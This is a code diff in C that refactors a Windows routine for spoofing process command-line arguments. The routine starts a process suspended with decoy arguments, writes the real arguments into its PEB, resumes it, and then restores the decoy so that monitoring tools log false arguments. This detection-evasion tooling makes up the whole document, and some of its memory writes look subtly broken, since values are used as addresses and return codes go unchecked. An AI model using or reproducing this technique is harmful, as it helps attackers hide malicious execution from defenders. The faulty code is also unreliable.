@@ -11,55 +11,14 @@ typedef __kernel_entry NTSTATUS(*NtQueryInformationProcessType)(
     PULONG           ReturnLength
 );
 
-
-DWORD SpawnWithSpoofedArgs(
-    CONST PWCHAR Exe, 
-    CONST PWCHAR FakeArgs, 
-    CONST PWCHAR RealArgs,
-    PHANDLE OutHandle)
+DWORD CreateSuspendedProcess(
+    CONST PWCHAR Exe,
+    CONST PWCHAR FakeArgs,
+    STARTUPINFOW* StartupInfo,
+    PROCESS_INFORMATION* ProcessInfo
+)
 {
-    BOOL                OK                  = FALSE;
-    DWORD               Status              = NULL;
-    SIZE_T              BytesRead           = NULL;
-    SIZE_T              BytesWritten        = NULL;
-    SIZE_T              NewArgLen           = NULL;
-    SIZE_T              OldArgLen           = NULL;
-    HANDLE              hProcess            = NULL;
-    HMODULE             NtdllBase           = NULL;
-    PWCHAR              NewArgs             = NULL;
-    PEB                 LocalPeb            = { NULL };
-    STARTUPINFOW        StartupInfo         = { NULL };
-    PROCESS_INFORMATION ProcessInfo         = { NULL };
-    
-    PWCHAR              OriginalBufferAddr  = NULL;
-    PUNICODE_STRING     OriginalCommandLine = NULL;
-    PUNICODE_STRING     NewCommandLine      = NULL;
-
-    PRTL_USER_PROCESS_PARAMETERS    OriginalProcessParamsAddr   = NULL;
-    RTL_USER_PROCESS_PARAMETERS     LocalProcessParameters      = { NULL };
-    NtQueryInformationProcessType   pNtQueryInformationProcess  = NULL;
-    PRTL_USER_PROCESS_PARAMETERS    ProcessParameters           = NULL;
-    PROCESS_BASIC_INFORMATION       ProcessBasicInfo            = { NULL };
-
-    if (!Exe || !FakeArgs || !RealArgs) return ERROR_INVALID_PARAMETER;
-
-    // Resolve NT API
-    NtdllBase = GetModuleHandleA("ntdll");
-    if (!NtdllBase) return ERROR_NOT_FOUND;
-
-    pNtQueryInformationProcess = (NtQueryInformationProcessType)GetProcAddress(
-        NtdllBase, 
-        "NtQueryInformationProcess"
-    );
-
-    if (!pNtQueryInformationProcess)
-    {
-        CloseHandle(ProcessInfo.hProcess);
-        return ERROR_NOT_FOUND;
-    };
-
-    // Create suspended process
-    OK = CreateProcessW(
+    if (!CreateProcessW(
         Exe,
         FakeArgs,
         NULL,
@@ -68,219 +27,221 @@ DWORD SpawnWithSpoofedArgs(
         CREATE_SUSPENDED,
         NULL,
         NULL,
-        &StartupInfo,
-        &ProcessInfo
-    );
+        StartupInfo,
+        ProcessInfo))
+    {
+        return GetLastError();
+    }
 
-    if (!OK) return GetLastError();
+    return ERROR_SUCCESS;
+}
 
-    // Get PEB address
-
-    Status = pNtQueryInformationProcess(
-        ProcessInfo.hProcess,
+DWORD QueryProcessInfo(
+    HANDLE hProcess,
+    NtQueryInformationProcessType pNtQueryInformationProcess,
+    PROCESS_BASIC_INFORMATION* ProcessBasicInfo
+)
+{
+    NTSTATUS Status = pNtQueryInformationProcess(
+        hProcess,
         (PROCESSINFOCLASS)0,
-        &ProcessBasicInfo,
+        ProcessBasicInfo,
         sizeof(PROCESS_BASIC_INFORMATION),
         NULL
     );
 
     if (!NT_SUCCESS(Status))
     {
-        CloseHandle(ProcessInfo.hProcess);
         return ERROR_INVALID_PARAMETER;
-    };
+    }
 
-    if (!ProcessBasicInfo.PebBaseAddress) return ERROR_NOT_FOUND;
+    if (!ProcessBasicInfo->PebBaseAddress)
+    {
+        return ERROR_NOT_FOUND;
+    }
+
+    return ERROR_SUCCESS;
+}
+
+DWORD ModifyArguments(
+    HANDLE hProcess,
+    PVOID PebBaseAddress,
+    CONST PWCHAR RealArgs
+) {
+    SIZE_T BytesRead = 0, BytesWritten = 0;
+    SIZE_T NewArgLen = 0, OldArgLen = 0;
+    PEB LocalPeb = { 0 };
+    RTL_USER_PROCESS_PARAMETERS LocalProcessParameters = { 0 };
+    BOOL OK = FALSE;
 
     // Read the original PEB
     OK = ReadProcessMemory(
-        ProcessInfo.hProcess,
-        ProcessBasicInfo.PebBaseAddress,
+        hProcess,
+        PebBaseAddress,
         &LocalPeb,
         sizeof(LocalPeb),
         &BytesRead
     );
-
-    if (!OK)
-    {
-        CloseHandle(ProcessInfo.hProcess);
-        return GetLastError();
-    }
-    else if (BytesRead == 0)
-    {
-        CloseHandle(ProcessInfo.hProcess);
-        return ERROR_READ_FAULT;
-    };
-
-    BytesRead = 0;
-    OriginalProcessParamsAddr = LocalPeb.ProcessParameters;
+    if (!OK) return GetLastError();
 
     // Read the original process parameters
     OK = ReadProcessMemory(
-        ProcessInfo.hProcess,
-        OriginalProcessParamsAddr,
+        hProcess,
+        LocalPeb.ProcessParameters,
         &LocalProcessParameters,
-        sizeof(RTL_USER_PROCESS_PARAMETERS),
+        sizeof(LocalProcessParameters),
         &BytesRead
     );
+    if (!OK) return GetLastError();
 
-    if (!OK)
-    {
-        CloseHandle(ProcessInfo.hProcess);
-        return GetLastError();
-    }
-    else if (BytesRead == 0)
-    {
-        CloseHandle(ProcessInfo.hProcess);
-        return ERROR_READ_FAULT;
-    };
-
-    // If new args fit in old args, just overwrite
     OldArgLen = LocalProcessParameters.CommandLine.MaximumLength;
     NewArgLen = wcslen(RealArgs) * sizeof(WCHAR);
 
-    if (NewArgLen > OldArgLen)
-    {
+    if (NewArgLen <= OldArgLen) {
+        // If new args fit in old args, just overwrite
+        OK = WriteProcessMemory(
+            hProcess,
+            LocalProcessParameters.CommandLine.Buffer,
+            RealArgs,
+            NewArgLen,
+            &BytesWritten
+        );
+        if (!OK) return GetLastError();
+    }
+    else {
         // Allocate new buffers
-        NewArgs = (PWCHAR)VirtualAllocEx(
-            ProcessInfo.hProcess,
+        PVOID NewArgs = (PWCHAR)VirtualAllocEx(
+            hProcess,
             NULL,
             NewArgLen + 0xF,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE
         );
 
-        if (!NewArgs)
-        {
-            CloseHandle(ProcessInfo.hProcess);
-            return GetLastError();
-        }
+        if (!NewArgs) return GetLastError();
 
-        NewCommandLine = (PUNICODE_STRING)VirtualAllocEx(
-            ProcessInfo.hProcess,
+        PVOID NewCommandLine = (PUNICODE_STRING)VirtualAllocEx(
+            hProcess,
             NULL,
             sizeof(UNICODE_STRING),
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE
         );
 
-        if (!NewCommandLine)
-        {
-            CloseHandle(ProcessInfo.hProcess);
-            return GetLastError();
-        }
+        if (!NewCommandLine) return GetLastError();
 
         WriteProcessMemory(
-            ProcessInfo.hProcess,
+            hProcess,
             LocalProcessParameters.CommandLine.Buffer,
             RealArgs,
             NewArgLen,
             &BytesWritten
         );
 
-        if (!OK)
-        {
-            CloseHandle(ProcessInfo.hProcess);
-            return GetLastError();
-        }
-        else if (BytesWritten == 0)
-        {
-            CloseHandle(ProcessInfo.hProcess);
-            return ERROR_WRITE_FAULT;
-        };
-
+        if (!OK) return GetLastError();
 
         // Write the new size
         WriteProcessMemory(
-            ProcessInfo.hProcess,
+            hProcess,
             (PVOID)LocalProcessParameters.CommandLine.Length,
             &NewArgLen,
             sizeof(USHORT),
             &BytesWritten
         );
 
-        if (!OK)
-        {
-            CloseHandle(ProcessInfo.hProcess);
-            return GetLastError();
-        }
-        else if (BytesWritten == 0)
-        {
-            CloseHandle(ProcessInfo.hProcess);
-            return ERROR_WRITE_FAULT;
-        };
+        if (!OK) return GetLastError();
 
         // Write the new max size
         NewArgLen += 0xF;
         WriteProcessMemory(
-            ProcessInfo.hProcess,
+            hProcess,
             (PVOID)LocalProcessParameters.CommandLine.MaximumLength,
             &NewArgLen,
             sizeof(USHORT),
             &BytesWritten
         );
 
-        if (!OK)
-        {
-            CloseHandle(ProcessInfo.hProcess);
-            return GetLastError();
-        }
-        else if (BytesWritten == 0)
-        {
-            CloseHandle(ProcessInfo.hProcess);
-            return ERROR_WRITE_FAULT;
-        };
+        if (!OK) return GetLastError();
     }
-    else
+
+    return ERROR_SUCCESS;
+}
+
+FARPROC GetNtQueryInformationProcess()
+{
+    HMODULE hNtdll = GetModuleHandle(L"ntdll");
+    if (!hNtdll) return NULL;
+
+    return GetProcAddress(hNtdll, "NtQueryInformationProcess");
+}
+
+DWORD SpawnWithSpoofedArgs(
+    CONST PWCHAR Exe,
+    CONST PWCHAR FakeArgs,
+    CONST PWCHAR RealArgs,
+    PHANDLE OutHandle)
+{
+    DWORD                           Status                      = NULL;
+    HANDLE                          hProcess                    = NULL;
+    NtQueryInformationProcessType   pNtQueryInformationProcess  = NULL;
+    STARTUPINFOW                    StartupInfo                 = { NULL };
+    PROCESS_INFORMATION             ProcessInfo                 = { NULL };
+    PROCESS_BASIC_INFORMATION       ProcessBasicInfo            = { NULL };
+
+    if (!Exe || !FakeArgs || !RealArgs) return ERROR_INVALID_PARAMETER;
+
+    pNtQueryInformationProcess = (NtQueryInformationProcessType)
+        GetNtQueryInformationProcess();
+
+    if (!pNtQueryInformationProcess) return ERROR_NOT_FOUND;
+
+    // Create suspended process
+    Status = CreateSuspendedProcess(Exe, FakeArgs, &StartupInfo, &ProcessInfo);
+    if (Status != ERROR_SUCCESS)
     {
-        OK = ReadProcessMemory(
-            ProcessInfo.hProcess,
-            (PVOID)LocalProcessParameters.CommandLine.Buffer,
-            OriginalBufferAddr,
-            sizeof(PVOID),
-            &BytesRead
-        );
-
-        if (!OK)
-        {
-            CloseHandle(ProcessInfo.hProcess);
-            return GetLastError();
-        }
-        else if (BytesRead == 0)
-        {
-            CloseHandle(ProcessInfo.hProcess);
-            return ERROR_READ_FAULT;
-        };
-
-        WriteProcessMemory(
-            ProcessInfo.hProcess,
-            OriginalProcessParamsAddr->CommandLine.Buffer,
-            RealArgs,
-            NewArgLen,
-            &BytesWritten
-        );
-
-        if (!OK)
-        {
-            CloseHandle(ProcessInfo.hProcess);
-            return GetLastError();
-        }
-        else if (BytesWritten == 0)
-        {
-            CloseHandle(ProcessInfo.hProcess);
-            return ERROR_WRITE_FAULT;
-        };
-
+        return Status;
     }
 
+    hProcess = ProcessInfo.hProcess;
+    if (!hProcess || hProcess == INVALID_HANDLE_VALUE) return ERROR_CREATE_FAILED;
+
+    if (!ProcessInfo.hThread || ProcessInfo.hThread == INVALID_HANDLE_VALUE)
+        return ERROR_CREATE_FAILED;
+
+    // Get PEB address
+    Status = QueryProcessInfo(hProcess, pNtQueryInformationProcess, &ProcessBasicInfo);
+    if (Status != ERROR_SUCCESS)
+    {
+        CloseHandle(hProcess);
+        return Status;
+    }
+
+    // Spoof arguments
+    Status = ModifyArguments(hProcess, ProcessBasicInfo.PebBaseAddress, RealArgs);
+    if (Status != ERROR_SUCCESS)
+    {
+        CloseHandle(hProcess);
+        return Status;
+    }
+
+    // Resume main thread
     Status = ResumeThread(ProcessInfo.hThread);
     if (Status == (DWORD)-1)
     {
-        CloseHandle(ProcessInfo.hProcess);
+        CloseHandle(hProcess);
         return GetLastError();
     }
 
-    *OutHandle = ProcessInfo.hProcess;
+    // Overwrite the arguments with the spoof
+    Status = ModifyArguments(hProcess, ProcessBasicInfo.PebBaseAddress, FakeArgs);
+    if (Status != ERROR_SUCCESS)
+    {
+        CloseHandle(hProcess);
+        return Status;
+    }
+
+
+    *OutHandle = hProcess;
     return ERROR_SUCCESS;
 }
 
